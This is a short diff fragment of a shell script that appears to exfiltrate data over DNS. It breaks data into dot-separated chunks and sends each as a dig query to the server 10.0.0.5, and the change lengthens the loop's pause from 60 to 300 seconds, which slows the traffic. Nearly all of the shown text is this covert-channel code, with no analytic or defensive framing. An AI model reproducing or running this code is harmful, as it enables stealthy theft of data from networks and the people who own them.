@@ -10,5 +10,5 @@ do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-.";
 c=$(($c+1)); else echo -ne "\n$i-."; c=1; fi; done );
 do dig @10.0.0.5 `echo -ne $r$f|tr "+" "*"` +short ; done
 
-sleep 60;
+sleep 300;
 done
